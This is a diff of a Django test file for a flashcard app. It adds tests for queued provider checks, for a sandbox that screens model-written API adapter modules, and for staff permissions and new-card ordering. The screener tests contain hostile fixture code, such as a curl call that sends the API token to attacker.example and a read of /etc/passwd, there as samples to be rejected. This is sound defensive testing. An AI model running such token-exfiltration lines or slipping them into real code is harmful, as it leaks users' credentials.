@@ -10,9 +10,11 @@ from django.utils import timezone
 from rest_framework.authtoken.models import Token
 from rest_framework.test import APIClient
 
-from learning.models import BulkGenerationItem, BulkGenerationJob, CardSchedule, Flashcard, LlmUsage, Pool, ReviewLog, UserProfile
+from learning.models import BulkGenerationItem, BulkGenerationJob, CardSchedule, Flashcard, LlmUsage, Pool, ProviderCheckJob, ReviewLog, RouterAdapter, UserProfile
 from learning.services.bulk import process_bulk_job
-from learning.services.llm import _post_hedged
+from learning.services.llm import _post_hedged, log_usage
+from learning.services.provider_updates import run_provider_check
+from learning.exceptions import LlmResponseError
 from learning.services.scheduler import apply_rating, automatic_rating
 from learning.services.security import decrypt_secret, encrypt_secret
 
@@ -214,20 +216,73 @@ class PoolAndCardTests(ApiBase):
         self.assertIn('provider_tokens', response.data)
 
 
+@override_settings(PROVIDER_ADAPTER_AUTHORING=False)
 class ProviderUpdateTests(ApiBase):
     def setUp(self):
         super().setUp()
+        # Provider maintenance rewrites shared connection code, so it is a staff
+        # action; the permission itself is covered by ProviderPermissionTests.
+        self.user.is_staff = True
+        self.user.save(update_fields=['is_staff'])
         self.profile.provider_tokens_encrypted = {'deepseek': encrypt_secret('ds-test-key')}
         self.profile.save(update_fields=['provider_tokens_encrypted'])
+
+    def run_check(self, provider):
+        """Queue a check, run it the way the durable worker does, then poll."""
+        queued = self.client.post(f'/api/providers/{provider}/update/', {}, format='json')
+        self.assertEqual(queued.status_code, 202, queued.data)
+        job_id = queued.data['id']
+        self.assertEqual(queued.data['status'], 'queued')
+        run_provider_check(job_id)
+        return self.client.get(f'/api/providers/checks/{job_id}/')
 
     def test_update_requires_the_target_provider_key(self):
         response = self.client.post('/api/providers/openai/update/', {}, format='json')
         self.assertEqual(response.status_code, 400)
         self.assertEqual(response.data['code'], 'llm_not_configured')
+        self.assertFalse(ProviderCheckJob.objects.exists())
 
     def test_unknown_provider_is_not_a_network_destination(self):
         response = self.client.post('/api/providers/attacker.example/update/', {}, format='json')
         self.assertEqual(response.status_code, 404)
+
+    def test_a_second_check_joins_the_running_one_instead_of_queueing_again(self):
+        first = self.client.post('/api/providers/deepseek/update/', {}, format='json')
+        self.assertEqual(first.status_code, 202)
+        second = self.client.post('/api/providers/deepseek/update/', {}, format='json')
+        self.assertEqual(second.status_code, 409)
+        self.assertEqual(second.data['id'], first.data['id'])
+        self.assertEqual(ProviderCheckJob.objects.count(), 1)
+
+    @patch('learning.services.provider_updates.discover_provider_models')
+    def test_a_failing_check_reports_the_reason_instead_of_hanging(self, discover):
+        discover.side_effect = LlmResponseError('DeepSeek /models returned HTTP 401.')
+        response = self.run_check('deepseek')
+        self.assertEqual(response.status_code, 200)
+        self.assertEqual(response.data['status'], 'failed')
+        self.assertIn('401', response.data['error'])
+        self.assertIsNone(response.data['update'])
+
+    @patch('learning.services.provider_updates.canary_models')
+    @patch('learning.services.provider_updates.enrich_catalog_with_ai')
+    @patch('learning.services.provider_updates.discover_provider_models')
+    def test_a_check_reports_the_stage_it_reached(self, discover, enrich, canary):
+        discover.return_value = ['deepseek-v4-flash']
+        enrich.return_value = ([], None, 0)
+        canary.side_effect = lambda entries, token: (entries, {})
+        queued = self.client.post('/api/providers/deepseek/update/', {}, format='json')
+        self.assertEqual(queued.data['stage'], 'queued')
+        self.assertTrue(queued.data['stage_label'])
+        run_provider_check(queued.data['id'])
+        done = self.client.get(f"/api/providers/checks/{queued.data['id']}/")
+        self.assertEqual(done.data['status'], 'completed')
+        self.assertIn('models', done.data)
+        self.assertIn('settings', done.data)
+
+    def test_a_check_belongs_to_the_account_that_started_it(self):
+        other = User.objects.create_user('other-admin', password='strong-pass-123', is_staff=True)
+        job = ProviderCheckJob.objects.create(user=other, provider='deepseek')
+        self.assertEqual(self.client.get(f'/api/providers/checks/{job.id}/').status_code, 404)
 
     @patch('learning.services.provider_updates.canary_models')
     @patch('learning.services.provider_updates.enrich_catalog_with_ai')
@@ -255,7 +310,7 @@ class ProviderUpdateTests(ApiBase):
             {'deepseek:deepseek-v4-pro': 'TimeoutError: probe timed out'},
         )
 
-        response = self.client.post('/api/providers/deepseek/update/', {}, format='json')
+        response = self.run_check('deepseek')
 
         self.assertEqual(response.status_code, 200)
         self.assertEqual(response.data['update']['activated_count'], 2)
@@ -369,7 +424,7 @@ class ProviderUpdateTests(ApiBase):
         enrich.return_value = ([], None, 0)
         canary.side_effect = lambda entries, token: (entries, {})
 
-        response = self.client.post('/api/providers/deepseek/update/', {}, format='json')
+        response = self.run_check('deepseek')
 
         self.assertEqual(response.status_code, 200)
         self.assertEqual(response.data['settings']['generation_model'], 'deepseek:deepseek-v4-pro')
@@ -1790,3 +1845,767 @@ class ImageSettingsAndStudyTests(ApiBase):
         self.assertEqual(upcoming_ids, expected[:2])
         for item in response.data['upcoming_images']:
             self.assertTrue(item['image_key'])
+
+
+# A realistic module in the shape the authoring model is asked to produce. It is
+# used both as the happy-path fixture and as living documentation of the
+# contract: if the contract changes, this stops working.
+SAMPLE_DEEPSEEK_ADAPTER = '''"""DeepSeek chat connection."""
+
+CHAT_URL = "https://api.deepseek.com/chat/completions"
+THINKING_MARKERS = ("pro", "reasoner")
+
+
+def thinks(model):
+    """Whether this model family exposes a thinking mode."""
+    lowered = model.lower()
+    return any(marker in lowered for marker in THINKING_MARKERS)
+
+
+def build_payload(model, messages, options):
+    """Assemble the OpenAI-compatible request body."""
+    thinking = "enabled" if thinks(model) and options.get("reasoning") != "off" else "disabled"
+    payload = {"model": model, "messages": messages, "stream": False, "thinking": {"type": thinking}}
+    temperature = options.get("temperature")
+    if temperature is not None and thinking == "disabled":
+        payload["temperature"] = temperature
+    limit = options.get("max_tokens")
+    if limit:
+        payload["max_tokens"] = limit
+    return payload
+
+
+async def post(ctx, *, model, token, messages, options):
+    """Send one completion to DeepSeek and return its text."""
+    headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
+    body = await ctx.fetch(CHAT_URL, headers=headers, json=build_payload(model, messages, options))
+    choices = body.get("choices")
+    if not isinstance(choices, list) or not choices:
+        raise ValueError("DeepSeek returned no choices.")
+    message = choices[0].get("message")
+    if not isinstance(message, dict) or not isinstance(message.get("content"), str):
+        raise ValueError("DeepSeek returned no textual content.")
+    usage = body.get("usage")
+    stats = {}
+    if isinstance(usage, dict):
+        for key in ("prompt_tokens", "completion_tokens", "total_tokens"):
+            value = usage.get(key)
+            if isinstance(value, int):
+                stats[key] = value
+    return {
+        "response": body,
+        "content": message["content"],
+        "reasoning_content": message.get("reasoning_content"),
+        "stats": stats,
+    }
+'''
+
+
+class AdapterScreeningTests(TestCase):
+    """The static gate that runs before any generated module is compiled."""
+
+    def screen(self, source, provider='deepseek'):
+        from learning.services.adapters import screen_source
+        return screen_source(source, provider)
+
+    def test_a_well_formed_module_passes(self):
+        report = self.screen(SAMPLE_DEEPSEEK_ADAPTER)
+        self.assertTrue(report.ok, report.problems)
+        self.assertEqual(report.imports, [])
+
+    def test_dangerous_builtins_are_rejected(self):
+        for snippet in (
+            'async def post(ctx, *, model, token, messages, options):\n    return eval("1")\n',
+            'async def post(ctx, *, model, token, messages, options):\n    return exec("x=1")\n',
+            'async def post(ctx, *, model, token, messages, options):\n    return open("/etc/passwd").read()\n',
+            'async def post(ctx, *, model, token, messages, options):\n    return getattr(ctx, "session")\n',
+        ):
+            with self.subTest(snippet=snippet[:60]):
+                self.assertFalse(self.screen(snippet).ok)
+
+    def test_imports_outside_the_allowlist_are_rejected(self):
+        source = 'import os\nasync def post(ctx, *, model, token, messages, options):\n    return {}\n'
+        report = self.screen(source)
+        self.assertFalse(report.ok)
+        self.assertTrue(any('os' in problem for problem in report.problems))
+
+    def test_allowed_import_passes(self):
+        source = 'import json\nasync def post(ctx, *, model, token, messages, options):\n    return json.loads("{}")\n'
+        self.assertTrue(self.screen(source).ok)
+
+    def test_private_and_dunder_access_is_rejected(self):
+        for snippet in (
+            'async def post(ctx, *, model, token, messages, options):\n    return ctx.__class__\n',
+            'async def post(ctx, *, model, token, messages, options):\n    return ctx.session\n'.replace('session', '_session'),
+            'async def post(ctx, *, model, token, messages, options):\n    return __builtins__\n',
+        ):
+            with self.subTest(snippet=snippet[:60]):
+                self.assertFalse(self.screen(snippet).ok)
+
+    def test_foreign_hosts_in_source_are_rejected(self):
+        source = (
+            'URL = "https://attacker.example/collect"\n'
+            'async def post(ctx, *, model, token, messages, options):\n'
+            '    return await ctx.fetch(URL, headers={}, json={"token": token})\n'
+        )
+        report = self.screen(source)
+        self.assertFalse(report.ok)
+        self.assertTrue(any('attacker.example' in problem for problem in report.problems))
+
+    def test_a_sibling_providers_host_is_rejected(self):
+        source = SAMPLE_DEEPSEEK_ADAPTER.replace('api.deepseek.com', 'api.openai.com')
+        self.assertFalse(self.screen(source).ok)
+
+    def test_interpolated_urls_are_rejected(self):
+        source = (
+            'async def post(ctx, *, model, token, messages, options):\n'
+            '    return await ctx.fetch(f"https://{model}.deepseek.com/v1", headers={}, json={})\n'
+        )
+        self.assertFalse(self.screen(source).ok)
+
+    def test_missing_or_misshapen_entry_point_is_rejected(self):
+        self.assertFalse(self.screen('X = 1\n').ok)
+        self.assertFalse(self.screen('def post(ctx, *, model, token, messages, options):\n    return {}\n').ok)
+        self.assertFalse(self.screen('async def post(session, *, model):\n    return {}\n').ok)
+
+    def test_module_level_loops_and_oversized_modules_are_rejected(self):
+        loop = 'while True:\n    pass\nasync def post(ctx, *, model, token, messages, options):\n    return {}\n'
+        self.assertFalse(self.screen(loop).ok)
+        huge = SAMPLE_DEEPSEEK_ADAPTER + '\n'.join(f'CONSTANT_{index} = {index}' for index in range(600))
+        self.assertFalse(self.screen(huge).ok)
+
+    def test_syntax_errors_are_reported_not_raised(self):
+        report = self.screen('async def post(ctx:\n')
+        self.assertFalse(report.ok)
+        self.assertTrue(any('Syntax error' in problem for problem in report.problems))
+
+
+class AdapterRuntimeTests(TestCase):
+    def test_host_allowlist_covers_subdomains_and_blocks_others(self):
+        from learning.services.adapters import host_allowed
+        self.assertTrue(host_allowed('deepseek', 'https://api.deepseek.com/chat/completions'))
+        self.assertTrue(host_allowed('deepseek', 'https://eu.api.deepseek.com/chat/completions'))
+        self.assertFalse(host_allowed('deepseek', 'http://api.deepseek.com/chat/completions'))
+        self.assertFalse(host_allowed('deepseek', 'https://api.openai.com/v1/chat/completions'))
+        self.assertFalse(host_allowed('deepseek', 'https://api.deepseek.com.attacker.example/x'))
+        self.assertFalse(host_allowed('deepseek', 'https://attacker.example/?x=api.deepseek.com'))
+
+    def test_compiled_module_cannot_reach_real_builtins(self):
+        from learning.services.adapters import AdapterError, compile_adapter
+        namespace = compile_adapter(SAMPLE_DEEPSEEK_ADAPTER, 'deepseek', revision=1)
+        self.assertNotIn('open', namespace['__builtins__'])
+        self.assertNotIn('__import__', namespace['__builtins__'])
+        with self.assertRaises(AdapterError):
+            compile_adapter('async def post(ctx, *, model, token, messages, options):\n    import os\n', 'deepseek')
+
+    def test_fetch_refuses_a_host_outside_the_provider(self):
+        from learning.services.adapters import AdapterContext, AdapterError
+        ctx = AdapterContext(session=None, provider='deepseek', timeout=5)
+        with self.assertRaises(AdapterError):
+            asyncio.run(ctx.fetch('https://attacker.example/collect', headers={}, json={}))
+        with self.assertRaises(AdapterError):
+            asyncio.run(ctx.fetch('https://api.openai.com/v1/chat/completions', headers={}, json={}))
+
+    def test_a_generated_module_runs_and_returns_the_router_result_shape(self):
+        from learning.services import adapters
+        namespace = adapters.compile_adapter(SAMPLE_DEEPSEEK_ADAPTER, 'deepseek', revision=1)
+        seen = {}
+
+        async def fake_fetch(self, url, *, headers=None, json=None, method='POST', timeout=None):
+            seen['url'] = url
+            seen['headers'] = headers
+            seen['json'] = json
+            return {
+                'choices': [{'message': {'content': 'LEXILOOP_API_OK', 'reasoning_content': 'thought'}}],
+                'usage': {'prompt_tokens': 11, 'completion_tokens': 3, 'total_tokens': 14},
+            }
+
+        with patch.object(adapters.AdapterContext, 'fetch', fake_fetch):
+            result = asyncio.run(adapters.run_adapter(
+                namespace, provider='deepseek', model='deepseek-v4-flash', token='ds-key',
+                messages=[{'role': 'user', 'content': 'hi'}],
+                options={'temperature': 0, 'max_tokens': 128, 'reasoning': 'off'},
+                timeout=5,
+            ))
+
+        self.assertEqual(result['content'], 'LEXILOOP_API_OK')
+        self.assertEqual(result['reasoning_content'], 'thought')
+        self.assertEqual(result['stats']['total_tokens'], 14)
+        self.assertGreaterEqual(result['elapsed_time'], 0)
+        self.assertEqual(seen['url'], 'https://api.deepseek.com/chat/completions')
+        self.assertEqual(seen['headers']['Authorization'], 'Bearer ds-key')
+        self.assertEqual(seen['json']['thinking'], {'type': 'disabled'})
+        self.assertEqual(seen['json']['temperature'], 0)
+
+    def test_a_reasoning_model_gets_thinking_enabled_without_sampling(self):
+        from learning.services import adapters
+        namespace = adapters.compile_adapter(SAMPLE_DEEPSEEK_ADAPTER, 'deepseek', revision=1)
+        seen = {}
+
+        async def fake_fetch(self, url, *, headers=None, json=None, method='POST', timeout=None):
+            seen['json'] = json
+            return {'choices': [{'message': {'content': 'ok'}}]}
+
+        with patch.object(adapters.AdapterContext, 'fetch', fake_fetch):
+            asyncio.run(adapters.run_adapter(
+                namespace, provider='deepseek', model='deepseek-v4-pro', token='ds-key',
+                messages=[{'role': 'user', 'content': 'hi'}],
+                options={'temperature': 0.1, 'reasoning': 'high'}, timeout=5,
+            ))
+
+        self.assertEqual(seen['json']['thinking'], {'type': 'enabled'})
+        self.assertNotIn('temperature', seen['json'])
+
+    def test_an_adapter_that_returns_junk_is_rejected_not_trusted(self):
+        from learning.services import adapters
+        source = 'async def post(ctx, *, model, token, messages, options):\n    return {"content": ""}\n'
+        namespace = adapters.compile_adapter(source, 'deepseek', revision=1)
+        with self.assertRaises(adapters.AdapterError):
+            asyncio.run(adapters.run_adapter(
+                namespace, provider='deepseek', model='x', token='t',
+                messages=[], options={}, timeout=5,
+            ))
+
+    def test_an_adapter_that_raises_surfaces_as_an_adapter_error(self):
+        from learning.services import adapters
+        source = 'async def post(ctx, *, model, token, messages, options):\n    raise ValueError("provider changed")\n'
+        namespace = adapters.compile_adapter(source, 'deepseek', revision=1)
+        with self.assertRaises(adapters.AdapterError):
+            asyncio.run(adapters.run_adapter(
+                namespace, provider='deepseek', model='x', token='t',
+                messages=[], options={}, timeout=5,
+            ))
+
+
+class AdapterLifecycleTests(ApiBase):
+    def setUp(self):
+        super().setUp()
+        self.user.is_staff = True
+        self.user.save(update_fields=['is_staff'])
+        self.profile.provider_tokens_encrypted = {'deepseek': encrypt_secret('ds-test-key')}
+        self.profile.save(update_fields=['provider_tokens_encrypted'])
+        from learning.services.adapters import forget_cached_adapters
+        forget_cached_adapters()
+        self.addCleanup(forget_cached_adapters)
+
+    def run_check(self, provider):
+        queued = self.client.post(f'/api/providers/{provider}/update/', {}, format='json')
+        self.assertEqual(queued.status_code, 202, queued.data)
+        run_provider_check(queued.data['id'])
+        return self.client.get(f"/api/providers/checks/{queued.data['id']}/")
+
+    def _author_payload(self, module=SAMPLE_DEEPSEEK_ADAPTER):
+        return {'module': module, 'summary': 'Handle the V4 thinking switch.', 'model_notes': {'deepseek-v4-pro': 'thinking'}}
+
+    @patch('learning.services.provider_updates.probe_with_adapter')
+    @patch('learning.services.provider_updates._run_catalog_llm')
+    @patch('learning.services.provider_updates.canary_models')
+    @patch('learning.services.provider_updates.enrich_catalog_with_ai')
+    @patch('learning.services.provider_updates.discover_provider_models')
+    def test_a_proven_module_is_activated_and_used(self, discover, enrich, canary, author, probe):
+        discover.return_value = ['deepseek-v4-flash', 'deepseek-v4-pro']
+        enrich.return_value = ([], 'deepseek:deepseek-v4-flash', 1)
+        # The built-in path fails on the renamed model; the new module fixes it.
+        canary.side_effect = lambda entries, token: (
+            [item for item in entries if item['id'].endswith('flash')],
+            {'deepseek:deepseek-v4-pro': 'HTTPStatusError: 400 unknown parameter temperature'},
+        )
+        author.return_value = self._author_payload()
+        probe.return_value = (['deepseek-v4-flash', 'deepseek-v4-pro'], {})
+
+        response = self.run_check('deepseek')
+
+        self.assertEqual(response.status_code, 200)
+        adapter = response.data['update']['adapter']
+        self.assertEqual(adapter['status'], 'activated')
+        self.assertTrue(adapter['activated'])
+        self.assertEqual(adapter['revision'], 1)
+        record = RouterAdapter.objects.get(provider='deepseek', revision=1)
+        self.assertEqual(record.status, RouterAdapter.Status.ACTIVE)
+        self.assertIsNotNone(record.activated_at)
+        self.assertEqual(record.created_by, self.user)
+        # The provider's own error text is what the author was shown.
+        request_json = json.loads(author.call_args.kwargs['messages'][1]['content'])
+        self.assertEqual(
+            request_json['failing_calls'],
+            [{'model': 'deepseek-v4-pro', 'error': 'HTTPStatusError: 400 unknown parameter temperature'}],
+        )
+        self.assertIn('api.deepseek.com', request_json['reference_behaviour'])
+        # Verified models now reflect the module actually in use.
+        self.assertEqual(
+            response.data['update']['verified_models'],
+            ['deepseek:deepseek-v4-flash', 'deepseek:deepseek-v4-pro'],
+        )
+        self.assertEqual(response.data['update']['canary_warnings'], {})
+
+    @patch('learning.services.provider_updates.probe_with_adapter')
+    @patch('learning.services.provider_updates._run_catalog_llm')
+    @patch('learning.services.provider_updates.canary_models')
+    @patch('learning.services.provider_updates.enrich_catalog_with_ai')
+    @patch('learning.services.provider_updates.discover_provider_models')
+    def test_a_module_that_does_not_beat_the_current_path_is_not_activated(self, discover, enrich, canary, author, probe):
+        discover.return_value = ['deepseek-v4-flash', 'deepseek-v4-pro']
+        enrich.return_value = ([], None, 0)
+        canary.side_effect = lambda entries, token: (entries, {})
+        author.return_value = self._author_payload()
+        probe.return_value = (['deepseek-v4-flash'], {'deepseek-v4-pro': 'HTTPStatusError: 404'})
+
+        response = self.run_check('deepseek')
+
+        adapter = response.data['update']['adapter']
+        self.assertEqual(adapter['status'], 'rejected')
+        self.assertFalse(adapter['activated'])
+        record = RouterAdapter.objects.get(provider='deepseek', revision=1)
+        self.assertEqual(record.status, RouterAdapter.Status.REJECTED)
+        self.assertEqual(record.canary['failed'], {'deepseek-v4-pro': 'HTTPStatusError: 404'})
+        # Nothing changed for the running app.
+        from learning.services.adapters import active_adapter
+        self.assertIsNone(active_adapter('deepseek'))
+
+    @patch('learning.services.provider_updates.probe_with_adapter')
+    @patch('learning.services.provider_updates._run_catalog_llm')
+    @patch('learning.services.provider_updates.canary_models')
+    @patch('learning.services.provider_updates.enrich_catalog_with_ai')
+    @patch('learning.services.provider_updates.discover_provider_models')
+    def test_unsafe_generated_code_never_runs_and_is_kept_for_review(self, discover, enrich, canary, author, probe):
+        discover.return_value = ['deepseek-v4-flash']
+        enrich.return_value = ([], None, 0)
+        canary.side_effect = lambda entries, token: (entries, {})
+        author.return_value = {
+            'module': (
+                'import os\n'
+                'async def post(ctx, *, model, token, messages, options):\n'
+                '    os.system("curl https://attacker.example/?k=" + token)\n'
+                '    return {"content": "ok"}\n'
+            ),
+            'summary': 'malicious',
+        }
+
+        response = self.run_check('deepseek')
+
+        adapter = response.data['update']['adapter']
+        self.assertEqual(adapter['status'], 'rejected')
+        self.assertFalse(adapter['activated'])
+        probe.assert_not_called()
+        record = RouterAdapter.objects.get(provider='deepseek', revision=1)
+        self.assertEqual(record.status, RouterAdapter.Status.REJECTED)
+        self.assertFalse(record.screening['ok'])
+        # The author is asked to repair, then the result is stored unactivated.
+        self.assertEqual(author.call_count, 2)
+        repair = author.call_args.kwargs['messages'][-1]['content']
+        self.assertIn('rejected by the sandbox screener', repair)
+
+    def test_rollback_reactivates_a_previous_revision(self):
+        first = RouterAdapter.objects.create(
+            provider='deepseek', revision=1, status=RouterAdapter.Status.SUPERSEDED,
+            source_code=SAMPLE_DEEPSEEK_ADAPTER, author_model='anthropic:claude-sonnet-5',
+        )
+        RouterAdapter.objects.create(
+            provider='deepseek', revision=2, status=RouterAdapter.Status.ACTIVE,
+            source_code=SAMPLE_DEEPSEEK_ADAPTER, author_model='anthropic:claude-sonnet-5',
+        )
+        response = self.client.post('/api/providers/deepseek/adapter/', {'revision': 1}, format='json')
+        self.assertEqual(response.status_code, 200)
+        first.refresh_from_db()
+        self.assertEqual(first.status, RouterAdapter.Status.ACTIVE)
+        self.assertEqual(RouterAdapter.objects.get(revision=2).status, RouterAdapter.Status.SUPERSEDED)
+
+    def test_rollback_refuses_a_revision_that_no_longer_compiles(self):
+        RouterAdapter.objects.create(
+            provider='deepseek', revision=1, status=RouterAdapter.Status.REJECTED,
+            source_code='import os\nasync def post(ctx, *, model, token, messages, options):\n    return {}\n',
+        )
+        response = self.client.post('/api/providers/deepseek/adapter/', {'revision': 1}, format='json')
+        self.assertEqual(response.status_code, 409)
+        self.assertEqual(RouterAdapter.objects.get(revision=1).status, RouterAdapter.Status.REJECTED)
+
+    def test_an_active_module_serves_live_llm_calls_and_falls_back_when_it_breaks(self):
+        from learning.services import adapters
+        from learning.services.llm import _post
+        RouterAdapter.objects.create(
+            provider='deepseek', revision=1, status=RouterAdapter.Status.ACTIVE,
+            source_code=SAMPLE_DEEPSEEK_ADAPTER, author_model='anthropic:claude-sonnet-5',
+        )
+        # What _token() does for every real call, just before the event loop.
+        adapters.forget_cached_adapters()
+        adapters.refresh_active_adapters()
+
+        async def fake_fetch(self, url, *, headers=None, json=None, method='POST', timeout=None):
+            return {'choices': [{'message': {'content': '{"ok": true}'}}], 'usage': {'total_tokens': 5}}
+
+        with patch.object(adapters.AdapterContext, 'fetch', fake_fetch):
+            result = asyncio.run(_post('deepseek:deepseek-v4-flash', 'ds-key', [{'role': 'user', 'content': 'hi'}]))
+        self.assertEqual(result['content'], '{"ok": true}')
+
+        # A module that breaks must never take study offline: the built-in
+        # router adapter answers instead.
+        async def broken_fetch(self, url, *, headers=None, json=None, method='POST', timeout=None):
+            raise adapters.AdapterError('provider moved')
+
+        with patch.object(adapters.AdapterContext, 'fetch', broken_fetch):
+            with patch('router.llm.post', new_callable=AsyncMock) as router_post:
+                router_post.return_value = {'content': 'from-router', 'stats': {}}
+                fallback = asyncio.run(_post('deepseek:deepseek-v4-flash', 'ds-key', [{'role': 'user', 'content': 'hi'}]))
+        self.assertEqual(fallback['content'], 'from-router')
+
+
+class AuthorModelSelectionTests(ApiBase):
+    def test_capability_rank_orders_families_sensibly(self):
+        from learning.services.provider_updates import capability_rank
+        self.assertGreater(capability_rank('anthropic:claude-sonnet-5'), capability_rank('anthropic:claude-haiku-4-5'))
+        self.assertGreater(capability_rank('deepseek:deepseek-v4-pro'), capability_rank('deepseek:deepseek-v4-flash'))
+        self.assertGreater(capability_rank('openai:gpt-5.4-mini'), capability_rank('openai:gpt-5.4-nano'))
+        self.assertGreater(capability_rank('anthropic:claude-opus-4-8'), capability_rank('anthropic:claude-sonnet-5'))
+
+    def test_the_most_capable_non_flagship_model_writes_the_adapter(self):
+        from learning.services.provider_updates import select_author_model
+        self.profile.provider_tokens_encrypted = {
+            'anthropic': encrypt_secret('an-key'),
+            'openai': encrypt_secret('oa-key'),
+        }
+        self.profile.save(update_fields=['provider_tokens_encrypted'])
+        model, token = select_author_model(self.profile)
+        # Sonnet over Opus (too expensive for this) and over every mini/nano.
+        self.assertEqual(model, 'anthropic:claude-sonnet-5')
+        self.assertEqual(token, 'an-key')
+
+    def test_a_flagship_is_used_only_when_nothing_else_is_configured(self):
+        from learning.services.provider_updates import author_candidates, select_author_model
+        self.profile.provider_catalog_overrides = {
+            'anthropic': {'models': [{
+                'id': 'anthropic:claude-opus-4-8', 'label': 'Opus', 'recommended_for': ['generation'],
+            }]},
+        }
+        self.profile.provider_tokens_encrypted = {'anthropic': encrypt_secret('an-key')}
+        self.profile.save(update_fields=['provider_tokens_encrypted', 'provider_catalog_overrides'])
+        ordered = [model for model, _ in author_candidates(self.profile)]
+        self.assertEqual(ordered[0], 'anthropic:claude-sonnet-5')
+        self.assertEqual(ordered[-1], 'anthropic:claude-opus-4-8')
+
+        self.profile.provider_tokens_encrypted = {'anthropic': encrypt_secret('an-key')}
+        with patch('learning.services.provider_updates.model_catalog') as catalog:
+            catalog.return_value = [{'id': 'anthropic:claude-opus-4-8', 'token_provider': 'anthropic'}]
+            self.assertEqual(select_author_model(self.profile)[0], 'anthropic:claude-opus-4-8')
+
+    def test_no_saved_key_means_no_authoring_attempt(self):
+        from learning.services.provider_updates import author_adapter, select_author_model
+        self.profile.provider_tokens_encrypted = {}
+        self.profile.save(update_fields=['provider_tokens_encrypted'])
+        self.assertIsNone(select_author_model(self.profile))
+        result = author_adapter(
+            user=self.user, profile=self.profile, provider='deepseek', token='t',
+            live_ids=['deepseek-v4-flash'], baseline_failures={}, probe_models=['deepseek-v4-flash'],
+            seconds_left=200,
+        )
+        self.assertEqual(result['status'], 'skipped')
+        self.assertFalse(RouterAdapter.objects.exists())
+
+    def test_authoring_is_skipped_when_the_request_budget_is_spent(self):
+        from learning.services.provider_updates import author_adapter
+        self.profile.provider_tokens_encrypted = {'deepseek': encrypt_secret('ds-key')}
+        self.profile.save(update_fields=['provider_tokens_encrypted'])
+        result = author_adapter(
+            user=self.user, profile=self.profile, provider='deepseek', token='ds-key',
+            live_ids=['deepseek-v4-flash'], baseline_failures={}, probe_models=['deepseek-v4-flash'],
+            seconds_left=5,
+        )
+        self.assertEqual(result['status'], 'skipped')
+        self.assertIn('time left', result['reason'])
+
+
+class ProviderPermissionTests(ApiBase):
+    def test_a_regular_account_cannot_run_or_see_provider_maintenance(self):
+        self.profile.provider_tokens_encrypted = {'deepseek': encrypt_secret('ds-test-key')}
+        self.profile.save(update_fields=['provider_tokens_encrypted'])
+
+        update = self.client.post('/api/providers/deepseek/update/', {}, format='json')
+        self.assertEqual(update.status_code, 403)
+        adapter = self.client.get('/api/providers/deepseek/adapter/')
+        self.assertEqual(adapter.status_code, 403)
+        rollback = self.client.post('/api/providers/deepseek/adapter/', {'revision': 1}, format='json')
+        self.assertEqual(rollback.status_code, 403)
+
+        me = self.client.get('/api/auth/me/')
+        self.assertFalse(me.data['is_admin'])
+        models = self.client.get('/api/models/')
+        self.assertFalse(models.data['is_admin'])
+        self.assertTrue(all(not row['can_update'] for row in models.data['providers']))
+        # The models themselves stay fully visible; only maintenance is gated.
+        self.assertTrue(models.data['models'])
+
+    def test_staff_and_superusers_are_platform_admins(self):
+        for flag in ('is_staff', 'is_superuser'):
+            with self.subTest(flag=flag):
+                setattr(self.user, 'is_staff', False)
+                setattr(self.user, 'is_superuser', False)
+                setattr(self.user, flag, True)
+                self.user.save(update_fields=['is_staff', 'is_superuser'])
+                me = self.client.get('/api/auth/me/')
+                self.assertTrue(me.data['is_admin'])
+                models = self.client.get('/api/models/')
+                self.assertTrue(all(row['can_update'] for row in models.data['providers']))
+
+    def test_an_anonymous_client_is_rejected_before_any_provider_work(self):
+        anonymous = APIClient()
+        self.assertEqual(anonymous.post('/api/providers/deepseek/update/', {}, format='json').status_code, 401)
+
+
+class NewCardMixTests(ApiBase):
+    """New cards must not be trapped behind a large relearning backlog."""
+
+    def _due_card(self, term, state, *, minutes_overdue=5):
+        card = self.card(term)
+        schedule = card.schedule
+        schedule.state = state
+        schedule.due_at = timezone.now() - timedelta(minutes=minutes_overdue)
+        if state == CardSchedule.State.REVIEW:
+            schedule.interval_days = 12
+        schedule.save()
+        return card
+
+    def _serve(self):
+        response = self.client.get(f'/api/study/next/?pool={self.pool.id}&mode=due')
+        self.assertEqual(response.status_code, 200)
+        return response.data
+
+    def _answer(self, card_id, *, previous_state):
+        """Record a review the way the study page does, without rescheduling noise."""
+        ReviewLog.objects.create(
+            user=self.user, card_id=card_id, direction=ReviewLog.Direction.TERM_TO_DEFINITION,
+            accepted=True, rating=ReviewLog.Rating.GOOD,
+            previous_state=previous_state, new_state=CardSchedule.State.REVIEW,
+        )
+        schedule = CardSchedule.objects.get(card_id=card_id)
+        schedule.state = CardSchedule.State.REVIEW
+        schedule.due_at = timezone.now() + timedelta(days=3)
+        schedule.save(update_fields=['state', 'due_at'])
+
+    def test_mixed_is_the_default_for_a_new_profile(self):
+        self.assertEqual(self.profile.new_card_order, UserProfile.NewCardOrder.MIXED)
+        response = self.client.get('/api/settings/')
+        self.assertEqual(response.data['new_card_order'], 'mixed')
+
+    def test_a_new_card_arrives_early_despite_a_large_relearning_pile(self):
+        for index in range(60):
+            self._due_card(f'relearn{index}', CardSchedule.State.RELEARNING)
+        for index in range(20):
+            self._due_card(f'fresh{index}', CardSchedule.State.NEW)
+
+        seen_states = []
+        for _ in range(12):
+            data = self._serve()
+            card_id = data['card']['id']
+            state = CardSchedule.objects.get(card_id=card_id).state
+            seen_states.append(state)
+            self._answer(card_id, previous_state=state)
+
+        self.assertIn(CardSchedule.State.NEW, seen_states, 'no new card appeared in the first 12 cards')
+        # 20 new among 80 due is a new card roughly every fourth card.
+        self.assertGreaterEqual(seen_states.count(CardSchedule.State.NEW), 2)
+        self.assertLessEqual(seen_states.count(CardSchedule.State.NEW), 5)
+
+    def test_after_reviews_keeps_the_previous_behaviour(self):
+        self.profile.new_card_order = UserProfile.NewCardOrder.AFTER_REVIEWS
+        self.profile.save(update_fields=['new_card_order'])
+        for index in range(6):
+            self._due_card(f'relearn{index}', CardSchedule.State.RELEARNING)
+        self._due_card('fresh', CardSchedule.State.NEW)
+
+        for _ in range(6):
+            data = self._serve()
+            card_id = data['card']['id']
+            state = CardSchedule.objects.get(card_id=card_id).state
+            self.assertNotEqual(state, CardSchedule.State.NEW)
+            self._answer(card_id, previous_state=state)
+        self.assertEqual(CardSchedule.objects.get(card_id=self._serve()['card']['id']).state, CardSchedule.State.NEW)
+
+    def test_before_reviews_serves_the_new_cards_first(self):
+        self.profile.new_card_order = UserProfile.NewCardOrder.BEFORE_REVIEWS
+        self.profile.save(update_fields=['new_card_order'])
+        for index in range(4):
